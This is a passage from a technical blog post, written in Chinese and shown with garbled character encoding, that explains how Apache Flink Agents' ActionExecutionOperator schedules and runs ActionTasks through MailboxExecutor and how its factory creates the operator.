	<span class="hljs-selector-tag">B</span> --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[ActionStateStore]</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc5aa8d1e3bd4f97a22437c09ff7d720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481060&amp;x-signature=eJqvLXpNUHEW4ocw6qLSeSLblzA%3D" alt="ActionExecutionOperatorflow-1" loading="lazy"/></p>
<p>ActionExecutionOperatorflow-1</p>
<h4 data-id="heading-8">1.6 æ ¸å¿ƒä¾èµ–ç»„ä»¶</h4>
<ul>
<li>
<p>AgentPlanï¼š<strong>AgentPlanä¼šè¢« ActionExecutionOperator ä½¿ç”¨ï¼Œå› ä¸ºæ“ä½œç¬¦éœ€è¦è®¿é—®AgentPlanä¸­çš„åŠ¨ä½œå®šä¹‰å’Œèµ„æºé…ç½®æ¥æ‰§è¡Œç›¸åº”é€»è¾‘</strong></p>
<ul>
<li>åŒ…å«Agentçš„æ‰€æœ‰åŠ¨ä½œå®šä¹‰å’Œèµ„æºé…ç½®</li>
<li>æä¾›åŠ¨ä½œè§¦å‘é€»è¾‘å’Œèµ„æºé…ç½®ä¿¡æ¯</li>
</ul>
</li>
<li>
<p>ActionTask åŠå…¶å­ç±»ï¼š</p>
<ul>
<li>JavaActionTask ï¼šæ‰§è¡Œ Java åŠ¨ä½œ</li>
<li>PythonActionTask ï¼šæ‰§è¡ŒPythonåŠ¨ä½œ</li>
</ul>
</li>
<li>
<p>Environment</p>
<ul>
<li>Flink Streaming Runtime Environmentï¼šActionExecutionOperator æ˜¯ä¸€ä¸ªFlink æµå¤„ç†æ“ä½œç¬¦ï¼Œä¼šè¢« Flink æµå¤„ç†è¿è¡Œæ—¶ç¯å¢ƒä½¿ç”¨ï¼Œä½œä¸ºæµå¤„ç†ä½œä¸š DAG å›¾ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚</li>
<li>RemoteExecutionEnvironmentï¼šåœ¨è¿œç¨‹æ‰§è¡Œç¯å¢ƒä¸­ï¼ŒRemoteExecutionEnvironment ä¼šåˆ›å»ºå’Œä½¿ç”¨ ActionExecutionOperator æ¥æ‰§è¡ŒAgent é€»è¾‘ã€‚</li>
</ul>
</li>
<li>
<p>RunnerContext åŠå…¶å®ç°ï¼š</p>
<ul>
<li>RunnerContextImplï¼šJava åŠ¨ä½œæ‰§è¡Œä¸Šä¸‹æ–‡</li>
<li>PythonRunnerContextImplï¼šPython åŠ¨ä½œæ‰§è¡Œä¸Šä¸‹æ–‡</li>
</ul>
</li>
<li>
<p>çŠ¶æ€ç®¡ç†ç»„ä»¶ã€‚ä»¥ä¸‹çŠ¶æ€å­˜å‚¨ç»„ä»¶ä¼šè¢« ActionExecutionOperator ä½¿ç”¨ã€‚</p>
<ul>
<li>Flink çŠ¶æ€åç«¯ï¼Œç”¨äºçŸ­æœŸå†…å­˜ã€å¾…å¤„ç†ä»»åŠ¡ç­‰ã€‚</li>
<li>ActionStateStoreï¼šKafkaActionStateStoreï¼šå¯é€‰çš„å¤–éƒ¨çŠ¶æ€å­˜å‚¨ï¼Œç”¨äºåŠ¨ä½œçŠ¶æ€æŒä¹…åŒ–å’Œæ¢å¤ã€‚</li>
</ul>
</li>
<li>
<p>Pythonç›¸å…³ç»„ä»¶ã€‚å½“ä»£ç†åŒ…å«PythonåŠ¨ä½œæ—¶ï¼Œä»¥ä¸‹ç»„ä»¶ä¼šä¸ ActionExecutionOperator ååŒå·¥ä½œã€‚</p>
<ul>
<li>PythonActionExecutorï¼šç®¡ç†Pythonç¯å¢ƒå’Œæ‰§è¡ŒPythonåŠ¨ä½œ</li>
<li>PythonActionTaskï¼šè¡¨ç¤ºPythonåŠ¨ä½œä»»åŠ¡</li>
<li>PythonRunnerContextImpl ï¼šPythonåŠ¨ä½œæ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</li>
</ul>
</li>
<li>
<p>è¾…åŠ©ç»„ä»¶</p>
<ul>
<li>EventLoggerï¼šäº‹ä»¶æ—¥å¿—è®°å½•å™¨</li>
<li>EventListnerï¼šäº‹ä»¶ç›‘å¬å™¨</li>
<li>BultInMetricsï¼šå†…ç½®æŒ‡æ ‡æ”¶é›†</li>
<li>FlinkAgentsMetricGroupImplï¼šæŒ‡æ ‡ç»„å®ç°</li>
</ul>
</li>
<li>
<p>äº‹ä»¶å¤„ç†ç›¸å…³ç»„ä»¶</p>
<ul>
<li>å„ç§Eventç±»å‹ï¼ˆInputEventã€OutputEventã€PythonEventç­‰ï¼‰</li>
<li>SegmentedQueueï¼šç®¡ç†æŒ‰é”®åˆ†æ®µçš„äº‹ä»¶é˜Ÿåˆ—å’Œæ°´å°å¤„ç†</li>
</ul>
</li>
</ul>
<h4 data-id="heading-9">1.7 ä¸»è¦åŠŸèƒ½</h4>
<p>ActionExecutionOperator ä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>åŠ¨ä½œæ‰§è¡Œæ ¸å¿ƒ</p>
<ul>
<li>æ‰§è¡ŒAgentä¸­å®šä¹‰çš„æ‰€æœ‰åŠ¨ä½œï¼ˆactionsï¼‰</li>
<li>å¤„ç†äº‹ä»¶é©±åŠ¨çš„æ‰§è¡Œæµç¨‹ï¼Œæ ¹æ®äº‹ä»¶ç±»å‹è§¦å‘çš„ç›¸åº”çš„åŠ¨ä½œ</li>
</ul>
</li>
<li>
<p>äº‹ä»¶å¤„ç†æµç¨‹</p>
<ul>
<li>æ¥æ”¶ä¸Šæ¸¸æ•°æ®å¹¶å°†å…¶åŒ…è£…æˆ InputEvent</li>
<li>æ ¹æ®äº‹ä»¶ç±»å‹è§¦å‘å¯¹åº”çš„ action æ‰§è¡Œ</li>
<li>å¯¹åº” OutputEvent ç±»å‹çš„äº‹ä»¶ï¼Œå°†æ•°æ®å‘é€åˆ°ä¸‹æ¸¸</li>
<li>å¯¹äºå…¶ä»–ç±»å‹çš„äº‹ä»¶ï¼Œç»§ç»­è§¦å‘ç›¸åº”çš„åŠ¨ä½œæ¥æ‰§è¡Œ</li>
</ul>
</li>
<li>
<p>çŠ¶æ€ç®¡ç†</p>
<ul>
<li>ç®¡ç†çŸ­æœŸå†…å­˜çŠ¶æ€ï¼ˆshort-term memoryï¼‰</li>
<li>ç»´æŠ¤åŠ¨ä½œæ‰§è¡ŒçŠ¶æ€å’Œåºåˆ—å·</li>
<li>æ”¯æŒæ£€æŸ¥ç‚¹å’Œæ•…éšœæ¢å¤</li>
<li>ä½¿ç”¨ Flink çŠ¶æ€åç«¯æŒä¹…åŒ–å…³é”®çŠ¶æ€ä¿¡æ¯</li>
</ul>
</li>
<li>
<p>æ··åˆè¯­è¨€æ”¯æŒ</p>
<ul>
<li>æ”¯æŒ Java å’Œ Python ä¸¤ç§è¯­è¨€ç¼–å†™çš„åŠ¨ä½œ</li>
<li>é€šè¿‡ PythonActionExecutor å¤„ç† Python åŠ¨ä½œçš„æ‰§è¡Œ</li>
<li>åœ¨åŒä¸€ä¸ªç®—å­ä¸­åè°ƒ Java å’Œ Python åŠ¨ä½œçš„æ‰§è¡Œ</li>
</ul>
</li>
<li>
<p>å¼‚æ­¥å¤„ç†æ”¯æŒ</p>
<ul>
<li>æ”¯æŒå¼‚æ­¥åŠ¨ä½œæ‰§è¡Œ</li>
<li>é€šè¿‡ MailboxExector ç®¡ç†å¼‚æ­¥ä»»åŠ¡</li>
<li>å¤„ç†é•¿æ—¶é—´è¿è¡Œçš„åŠ¨ä½œä»»åŠ¡</li>
</ul>
</li>
<li>
<p>ç›‘æ§å’Œæ—¥å¿—</p>
<ul>
<li>é›†æˆæŒ‡æ ‡æ”¶é›†å’Œç›‘æ§</li>
<li>æ”¯æŒäº‹ä»¶æ—¥å¿—è®°å½•</li>
<li>æä¾›å†…ç½®æŒ‡æ ‡è·Ÿè¸ªæ‰§è¡Œæƒ…å†µ</li>
</ul>
</li>
</ul>
<h4 data-id="heading-10">1.8 è¿è¡ŒActionTaskæµç¨‹</h4>
<p>ActionTask åœ¨ Flink ä¸­çš„è¿è¡Œæœºåˆ¶åˆ†ä¸‰æ­¥å®Œæˆï¼šåˆ›å»ºã€è°ƒåº¦ã€æ‰§è¡Œï¼Œå…¨ç¨‹ç”± ActionExecutionOperator æ‰˜ç®¡ï¼Œå¹¶åˆ©ç”¨ Flink çš„é‚®ç®±çº¿ç¨‹ä¿è¯å¹¶å‘å®‰å…¨ï¼Œå…·ä½“å¦‚ä¸‹ã€‚</p>
<h5 data-id="heading-11">åˆ›å»ºä¸åˆå§‹åŒ–</h5>
<ul>
<li>ä½œä¸šå¯åŠ¨æ—¶ï¼ŒActionExecutionOperator å®Œæˆå®ä¾‹åŒ–ï¼Œå†…éƒ¨æŒæœ‰ AgentPlanï¼ˆå«å…¨éƒ¨ Action å®šä¹‰ï¼‰ã€‚</li>
<li>ä¸Šæ¸¸æ•°æ®åˆ°è¾¾ processElement() åï¼Œå…ˆè¢«å°è£…æˆ InputEventï¼›éšåè°ƒç”¨ processEvent() å¼€å§‹å¤„ç†ã€‚</li>
</ul>
<h5 data-id="heading-12">ActionTask çš„åˆ›å»ºä¸è°ƒåº¦</h5>
<ul>
<li>
<p>processEvent() é€šè¿‡ getActionsTriggeredBy() æ‰¾å‡ºå“åº”è¯¥äº‹ä»¶çš„æ‰€æœ‰ Actionã€‚</p>
</li>
<li>
<p>å¯¹æ¯ä¸ª Actionï¼Œè°ƒç”¨ createActionTask() ç”Ÿæˆå¯¹åº”çš„ ActionTask å®ä¾‹ï¼Œå¹¶å­˜å…¥ actionTasksState çŠ¶æ€ã€‚</p>
</li>
<li>
<p>ä½¿ç”¨ Flink MailboxExecutor æäº¤å¼‚æ­¥ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">mailboxExecutor<span class="hljs-selector-class">.submit</span>(()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");
</code></pre>
<p>ä¿è¯åç»­é€»è¾‘åœ¨ mailbox çº¿ç¨‹ä¸­é¡ºåºæ‰§è¡Œï¼Œé¿å…å¹¶å‘å†²çªã€‚<strong>è¿™æ˜¯Agentä¸Flinkè¿›è¡Œç»“åˆçš„å…³é”®ä¹‹ä¸€ï¼Œæ˜¯Agentä»£ç è¿è¡Œçš„å…³é”®</strong>ã€‚</p>
</li>
</ul>
<h5 data-id="heading-13">ActionTask çš„æ‰§è¡Œ</h5>
<ul>
<li>
<p>tryProcessActionTaskForKey() â†’ processActionTaskForKey() ä» actionTasksState å–å‡ºå¾…å¤„ç†ä»»åŠ¡ã€‚</p>
</li>
<li>
<p>createAndSetRunnerContext() ä¸ºä»»åŠ¡ç»‘å®šè¿è¡Œæ—¶ä¸Šä¸‹æ–‡ï¼ˆå†…å­˜ã€æŒ‡æ ‡ã€é‚®ç®±æ£€æŸ¥ç­‰ï¼‰ã€‚</p>
</li>
<li>
<p>è°ƒç”¨ ActionTask.invoke() æ‰§è¡Œå…·ä½“åŠ¨ä½œé€»è¾‘ï¼›è‹¥ä»»åŠ¡è¿”å›æ–°ç”Ÿæˆå™¨ï¼ˆå¼‚æ­¥åœºæ™¯ï¼‰ï¼Œåˆ™å¾ªç¯åˆ›å»ºåç»­ ActionTask å¹¶å†æ¬¡æäº¤é‚®ç®±ï¼Œå®ç°â€œæ‹†åˆ†-ç»§ç»­â€æµç¨‹ã€‚</p>
<ul>
<li>ActionTask.invoke() è¿”å› ActionTaskResultï¼›è‹¥ä»»åŠ¡å·²å®Œæˆï¼ˆisFinished() ä¸º trueï¼‰ï¼Œåˆ™é€šè¿‡ processEvent() å‘ä¸‹æ¸¸å‘é€è¾“å‡ºäº‹ä»¶æˆ–è§¦å‘æ–°çš„ ActionTaskï¼Œå¹¶æŒä¹…åŒ–å†…å­˜çŠ¶æ€ã€‚</li>
<li>è‹¥ä»»åŠ¡æœªå®Œæˆï¼ˆå¼‚æ­¥æ“ä½œï¼‰ï¼Œåˆ™ä¿å­˜ RunnerContext ä¾›åç»­ä½¿ç”¨ï¼Œå¹¶å°†æ–°ç”Ÿæˆçš„ ActionTask åŠ å…¥ actionTasksStateï¼Œå†æ¬¡æäº¤åˆ° MailboxExecutorï¼Œå½¢æˆå¾ªç¯ç›´åˆ°æ‰€æœ‰ä»»åŠ¡å®Œæˆã€‚</li>
</ul>
</li>
</ul>
<h5 data-id="heading-14">çŠ¶æ€ç®¡ç†ä¸å®¹é”™</h5>
<ul>
<li>ä½¿ç”¨ Flink çŠ¶æ€åç«¯æŒä¹…åŒ– actionTasksStateã€pendingInputEventsState ç­‰ï¼›åœ¨ checkpoint æ—¶ä¿å­˜å¿«ç…§ï¼Œæ•…éšœæ¢å¤åå¯ç»§ç»­æ‰§è¡Œã€‚</li>
<li>å®ç° snapshotState() å’Œ initializeState() æ–¹æ³•ï¼Œå®ŒæˆçŠ¶æ€çš„å¿«ç…§ä¸æ¢å¤ã€‚</li>
</ul>
<p>æ•´ä¸ªæµç¨‹ä¾æ‰˜ Flink æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li>äº‹ä»¶é©±åŠ¨ï¼šåŸºäºäº‹ä»¶è§¦å‘åŠ¨ä½œæ‰§è¡Œï¼›</li>
<li>çŠ¶æ€ç®¡ç†ï¼šä½¿ç”¨ Flink çŠ¶æ€åç«¯ç®¡ç†ä¸­é—´çŠ¶æ€ï¼›</li>
<li>å®¹é”™æœºåˆ¶ï¼šé€šè¿‡ checkpoint å’ŒçŠ¶æ€æ¢å¤ä¿è¯ exactly-once è¯­ä¹‰ï¼›</li>
<li>å¼‚æ­¥å¤„ç†ï¼šé€šè¿‡ MailboxExecutor å®ç°é«˜æ•ˆçš„å¼‚æ­¥ä»»åŠ¡è°ƒåº¦ï¼›</li>
<li>é”®æ§å¤„ç†ï¼šæ”¯æŒæŒ‰é”®åˆ†åŒºå¤„ç†ï¼Œä¿è¯åŒä¸€é”®çš„æ•°æ®é¡ºåºå¤„ç†ã€‚</li>
</ul>
<p>é€šè¿‡â€œçŠ¶æ€å­˜å‚¨ + é‚®ç®±è°ƒåº¦â€åŒæœºåˆ¶ï¼ŒActionTask æ—¢èƒ½é¡ºåºå¤„ç†å•é”®äº‹ä»¶ï¼Œåˆèƒ½ä¼˜é›…æ‹†åˆ†å¼‚æ­¥æ­¥éª¤ï¼Œå…¨ç¨‹ä¸ Flink çš„å¹¶å‘æ¨¡å‹æ— ç¼è¡”æ¥ã€‚</p>
<h4 data-id="heading-15">1.8 Flink MailboxExecutor</h4>
<p>MailboxExecutor æ˜¯ Flink å†…éƒ¨çš„ä¸€ä¸ªâ€œå•çº¿ç¨‹é‚®ç­’â€è°ƒåº¦å™¨ï¼Œä½œç”¨å¯ä»¥ä¸€å¥è¯æ¦‚æ‹¬ï¼š <strong>â€œå¤–éƒ¨çº¿ç¨‹åªç®¡æŠ•ä¿¡ï¼Œå†…éƒ¨è®©åŒä¸€ä¸ªç®—å­/åŒä¸€ä¸ªé”®çš„æ‰€æœ‰ä»»åŠ¡æŒ‰é¡ºåºä¸€æ¡ä¸€æ¡æ‰§è¡Œï¼Œé¿å…å¹¶å‘ç«äº‰ï¼ŒåŒæ—¶ä¸é˜»å¡æ•´ä¸ª TaskManagerâ€</strong> ã€‚</p>
<h5 data-id="heading-16">ä¸ºä»€ä¹ˆéœ€è¦ MailboxExecutor</h5>
<ol>
<li>Flink ç®—å­å¯èƒ½è¢«å¤šçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼ˆç½‘ç»œçº¿ç¨‹ã€å¼‚æ­¥ I/Oã€ç”¨æˆ·å›è°ƒï¼‰ã€‚</li>
<li>å¾ˆå¤šç®—å­çŠ¶æ€ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆä¾‹å¦‚ keyed stateã€Python è§£é‡Šå™¨ï¼‰ã€‚</li>
<li>ä¸èƒ½æŠŠæ•´ä¸ªç®—å­é”èµ·æ¥ï¼Œå¦åˆ™èƒŒå‹ä¼šæ‹–å®æ•´ä¸ª TaskManagerã€‚</li>
</ol>
<p>â†’ è§£å†³æ–¹æ¡ˆï¼šæŠŠâ€œçœŸæ­£å¹²æ´»â€çš„ä»£ç æŠ•é€’åˆ°åŒä¸€ä¸ªâ€œé‚®ç®±â€é‡Œï¼Œç”±<strong>ä¸€æ¡ä¸“ç”¨çº¿ç¨‹</strong>æŒ‰é¡ºåºå–å‡ºæ‰§è¡Œï¼›å…¶ä»–çº¿ç¨‹åªè´Ÿè´£â€œæŠ•ä¿¡â€ï¼Œç¬é—´è¿”å›ï¼Œä¸ä¼šé˜»å¡ã€‚</p>
<h5 data-id="heading-17">ä½¿ç”¨åœºæ™¯é€Ÿè§ˆ</h5>

























<table><thead><tr><th>åœºæ™¯</th><th>æŠ•é€’åˆ°é‚®ç®±çš„ä»»åŠ¡</th><th>å¥½å¤„</th></tr></thead><tbody><tr><td>ActionTask æ‹†åˆ†</td><td><code>tryProcessActionTaskForKey(key)</code></td><td>åŒä¸€é”®çš„ä»»åŠ¡é¡ºåºæ‰§è¡Œï¼ŒçŠ¶æ€æ— é”</td></tr><tr><td>Python UDF å¼‚æ­¥</td><td><code>PythonGeneratorActionTask</code></td><td>è§£é‡Šå™¨å•çº¿ç¨‹ï¼Œé¿å… GIL ç«äº‰</td></tr><tr><td>ç½‘ç»œçº¿ç¨‹å›è°ƒ</td><td><code>onNext(record)</code></td><td>ç½‘ç»œçº¿ç¨‹ç«‹å³è¿”å›ï¼Œä¸é˜»å¡ TCP æ¥æ”¶</td></tr></tbody></table>
<h5 data-id="heading-18">å·¥ä½œæ¨¡å‹ï¼ˆç”¨é‚®ç­’æ¥éšå–»ï¼‰</h5>
<pre><code class="hljs language-scss" lang="scss">ä»»æ„çº¿ç¨‹ï¼ˆç½‘ç»œã€å¼‚æ­¥ã€ç”¨æˆ·ï¼‰Â Â 
Â Â Â â”œâ”€â†’Â mailbox<span class="hljs-selector-class">.put</span>(mail)Â Â Â <span class="hljs-comment">//Â éé˜»å¡ï¼Œç¬é—´è¿”å›Â Â </span>
Â Â Â â””â”€â†’Â ç«‹å³ç»§ç»­å¹²åˆ«çš„Â Â 

ä¸“ç”¨å•çº¿ç¨‹ï¼ˆMailboxÂ Threadï¼‰Â Â 
Â Â Â â”œâ”€â†’Â <span class="hljs-built_in">while</span>(true)Â mailÂ =Â mailbox<span class="hljs-selector-class">.take</span>()Â Â 
Â Â Â â”œâ”€â†’Â é¡ºåºæ‰§è¡ŒÂ mail<span class="hljs-selector-class">.run</span>()Â Â 
Â Â Â â””â”€â†’Â æ›´æ–°çŠ¶æ€ã€å‘ä¸‹æ¸¸ã€å†™Â checkpoint
</code></pre>
<ul>
<li>é‚®ç®±ä½¿ç”¨ <strong>æ— é”é˜Ÿåˆ—</strong>ï¼ˆDisruptorï¼‰ï¼Œput/take éƒ½æ˜¯ O(1) ä¸”çº¿ç¨‹å®‰å…¨ã€‚</li>
<li>å•çº¿ç¨‹å†…éƒ¨ä»å¯å¼‚æ­¥ï¼ˆä¾‹å¦‚ç”Ÿæˆå™¨è¿”å›æ–°çš„ ActionTaskï¼‰ï¼Œä½†<strong>çŠ¶æ€è¯»å†™æ— å¹¶å‘</strong>ã€‚</li>
</ul>
<p>å¯¹åº”ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//Â æŠ•é€’ä»»åŠ¡</span>
mailboxExecutor<span class="hljs-selector-class">.submit</span>(()Â -&gt;Â <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key),Â "processÂ actionÂ task");

<span class="hljs-comment">//Â é‚®ç®±çº¿ç¨‹å¾ªç¯ï¼ˆç®€åŒ–ï¼‰</span>
whileÂ (isRunning)Â {
Â Â Â Â RunnableÂ taskÂ =Â mailbox<span class="hljs-selector-class">.take</span>();Â Â Â <span class="hljs-comment">//Â é˜»å¡ç›´åˆ°æœ‰ä¿¡</span>
Â Â Â Â task<span class="hljs-selector-class">.run</span>();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â é¡ºåºæ‰§è¡Œ</span>
}
</code></pre>
<h3 data-id="heading-19">0x02 ActionExecutionOperator ç”Ÿæˆæœºåˆ¶å’Œç­–ç•¥</h3>
<h4 data-id="heading-20">2.1 ç”Ÿæˆä½ç½®</h4>
<p>ActionExecutionOperator åœ¨ ActionExecutionOperatorFactory ç±»ä¸­åˆ›å»ºã€‚ä»ä»£ç ç»“æ„å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªå·¥å‚ç±»è¢«ç”¨åœ¨ CompileUtils.connectToAgent() æ–¹æ³•ä¸­ã€‚</p>
<h4 data-id="heading-21">2.2 ç”Ÿæˆæœºåˆ¶</h4>
<h5 data-id="heading-22">åˆ›å»ºæµç¨‹</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>Â åœ¨Â CompileUtils.javaÂ ä¸­
privateÂ <span class="hljs-keyword">static</span>Â <span class="hljs-operator">&lt;</span>K,Â <span class="hljs-keyword">IN</span>,Â <span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span>Â DataStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span>Â connectToAgent(
Â Â Â Â KeyedStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">IN</span>,Â K<span class="hljs-operator">&gt;</span>Â keyedInputStream,
Â Â Â Â AgentPlanÂ agentPlan,
Â Â Â Â TypeInformation<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span>Â outTypeInformation,
Â Â Â Â <span class="hljs-type">boolean</span>Â inputIsJava)Â {
<span class="hljs-keyword">return</span>Â (DataStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span>)
Â Â Â Â keyedInputStream
Â Â Â Â Â Â Â Â .transform(
Â Â Â Â Â Â Â Â Â Â Â Â "action-execute-operator",
Â Â Â Â Â Â Â Â Â Â Â Â outTypeInformation,
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">new</span>Â ActionExecutionOperatorFactory(agentPlan,Â inputIsJava)
Â Â Â Â Â Â Â Â )
Â Â Â Â Â Â Â Â .setParallelism(keyedInputStream.getParallelism());
}
</code></pre>
<p>æ“ä½œç¬¦é€šè¿‡ Flink çš„ transform() æ–¹æ³•åˆ›å»ºï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸€ä¸ª ActionExecutionOperatorFactoryã€‚</p>
<h5 data-id="heading-23">å·¥å‚æ¨¡å¼å®ç°</h5>
<p>ActionExecutionOperatorFactory å®ç°äº† Flink çš„ StreamOperatorFactory æ¥å£ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">ActionExecutionOperatorFactory</span>Â <span class="hljs-keyword">implements</span>Â <span class="hljs-title class_">StreamOperatorFactory</span>&lt;<span class="hljs-title class_">Object</span>&gt;Â {
Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ <span class="hljs-title class_">AgentPlan</span>Â agentPlan;
Â Â Â Â <span class="hljs-keyword">private</span>Â finalÂ <span class="hljs-title class_">Boolean</span>Â inputIsJava;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span>Â &lt;TÂ <span class="hljs-keyword">extends</span>Â <span class="hljs-title class_">StreamOperator</span>&lt;<span class="hljs-title class_">Object</span>&gt;&gt;Â TÂ <span class="hljs-title function_">createStreamOperator</span>(<span class="hljs-params">
Â Â Â Â Â Â Â Â StreamOperatorParameters&lt;<span class="hljs-built_in">Object</span>&gt;Â parameters</span>)Â {
Â Â Â Â <span class="hljs-title class_">ProcessingTimeService</span>Â processingTimeServiceÂ =Â parameters.<span class="hljs-title function_">getProcessingTimeService</span>();
Â Â Â Â <span class="hljs-title class_">MailboxExecutor</span>Â mailboxExecutorÂ =Â parameters.<span class="hljs-title function_">getMailboxExecutor</span>();
Â Â Â Â <span class="hljs-keyword">return</span>Â (T)Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">ActionExecutionOperator</span>&lt;&gt;(
Â Â Â Â Â Â Â Â Â Â Â Â agentPlan,
Â Â Â Â Â Â Â Â Â Â Â Â inputIsJava,
Â Â Â Â Â Â Â Â Â Â Â Â processingTimeService,
Â Â Â Â Â Â Â Â Â Â Â Â mailboxExecutor,
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-literal">null</span>);Â <span class="hljs-comment">//Â actionStateStore</span>
}
</code></pre>
<h4 data-id="heading-24">2.3 å…³é”®ç”Ÿæˆç­–ç•¥</h4>
<h5 data-id="heading-25">ç­–ç•¥ 1ï¼šåŸºäºè®¡åˆ’çš„ç”Ÿæˆ</h5>
<ul>
<li>AgentPlan åŒ…å«å…³äºåŠ¨ä½œã€èµ„æºå’Œé…ç½®çš„æ‰€æœ‰å¿…è¦ä¿¡æ¯</li>
<li>è¿™ä¸ªè®¡åˆ’æ˜¯ä»ç”¨æˆ·å®šä¹‰çš„ Python æˆ– Java Agent ç”Ÿæˆçš„</li>
<li>æ“ä½œç¬¦çš„æ‰€æœ‰è¡Œä¸ºéƒ½åœ¨åˆ›å»ºæ—¶ç”±è¿™ä¸ªè®¡åˆ’å†³å®š</li>
</ul>
<h5 data-id="heading-26">ç­–ç•¥ 2ï¼šç±»å‹ç‰¹å®šå¤„ç†</h5>
<p>inputIsJava å‚æ•°å†³å®šäº†å¦‚ä½•å¤„ç†è¾“å…¥æ•°æ®ï¼š</p>
<ul>
<li>å¦‚æœä¸º trueï¼šè¾“å…¥å’Œè¾“å‡ºæ˜¯ Java å¯¹è±¡</li>
<li>å¦‚æœä¸º falseï¼šè¾“å…¥å’Œè¾“å‡ºæ˜¯å­—èŠ‚æ•°ç»„ï¼ˆç”¨äº Python äº’æ“ä½œï¼‰</li>
</ul>
<h5 data-id="heading-27">ç­–ç•¥ 3ï¼šèµ„æºç®¡ç†</h5>
<p>èµ„æºåœ¨åˆå§‹åŒ–æœŸé—´æ³¨å…¥åˆ°æ“ä½œç¬¦ä¸­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">//Â åœ¨Â ActionExecutionOperatorÂ æ„é€ å‡½æ•°ä¸­</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-title class_">ActionExecutionOperator</span>(
Â Â Â Â Â Â Â Â <span class="hljs-title class_">AgentPlan</span>Â agentPlan,
Â Â Â Â Â Â Â Â <span class="hljs-title class_">Boolean</span>Â inputIsJava,
Â Â Â Â Â Â Â Â <span class="hljs-title class_">ProcessingTimeService</span>Â processingTimeService,
Â Â Â Â Â Â Â Â <span class="hljs-title class_">MailboxExecutor</span>Â mailboxExecutor,
Â Â Â Â Â Â Â Â <span class="hljs-title class_">ActionStateStore</span>Â actionStateStore)Â {
Â Â Â Â ...
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span>Â &lt;TÂ <span class="hljs-keyword">extends</span>Â <span class="hljs-title class_">StreamOperator</span>&lt;<span class="hljs-title class_">Object</span>&gt;&gt;Â TÂ <span class="hljs-title function_">createStreamOperator</span>(<span class="hljs-params">
Â Â Â Â Â Â Â Â StreamOperatorParameters&lt;<span class="hljs-built_in">Object</span>&gt;Â parameters</span>)Â {
Â Â Â Â <span class="hljs-title class_">ProcessingTimeService</span>Â processingTimeServiceÂ =Â parameters.<span class="hljs-title function_">getProcessingTimeService</span>();
Â Â Â Â <span class="hljs-title class_">MailboxExecutor</span>Â mailboxExecutorÂ =Â parameters.<span class="hljs-title function_">getMailboxExecutor</span>();
Â Â Â Â <span class="hljs-keyword">return</span>Â (T)Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">ActionExecutionOperator</span>&lt;&gt;(
Â Â Â Â Â Â Â Â Â Â Â Â agentPlan,
Â Â Â Â Â Â Â Â Â Â Â Â inputIsJava,
Â Â Â Â Â Â Â Â Â Â Â Â processingTimeService,
Â Â Â Â Â Â Â Â Â Â Â Â mailboxExecutor,
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-literal">null</span>);Â <span class="hljs-comment">//Â actionStateStore</span>
}
</code></pre>
<h4 data-id="heading-28">2.4 æ“ä½œç¬¦åˆå§‹åŒ–è¿‡ç¨‹</h4>
<p>å½“æ“ä½œç¬¦æ‰“å¼€æ—¶ã€‚</p>
<p><strong>çŠ¶æ€åˆå§‹åŒ–ï¼š</strong></p>
<ul>
<li>çŸ­æœŸè®°å¿†çŠ¶æ€ï¼ˆ<code>shortTermMemState</code>ï¼‰</li>
<li>åŠ¨ä½œä»»åŠ¡çŠ¶æ€ï¼ˆ<code>actionTasksState</code>ï¼‰</li>
<li>å¾…å¤„ç†äº‹ä»¶çŠ¶æ€ï¼ˆ<code>pendingInputEventsState</code>ï¼‰</li>
<li>å¤„ç†ä¸­çš„é”®è·Ÿè¸ªçŠ¶æ€ï¼ˆ<code>currentProcessingKeysOpState</code>ï¼‰</li>
</ul>
<p><strong>ç»„ä»¶è®¾ç½®ï¼š</strong></p>
<ul>
<li>Python æ‰§è¡Œå™¨ï¼ˆå¦‚æœéœ€è¦ï¼‰</li>
<li>æŒ‡æ ‡æ”¶é›†</li>
<li>äº‹ä»¶æ—¥å¿—è®°å½•</li>
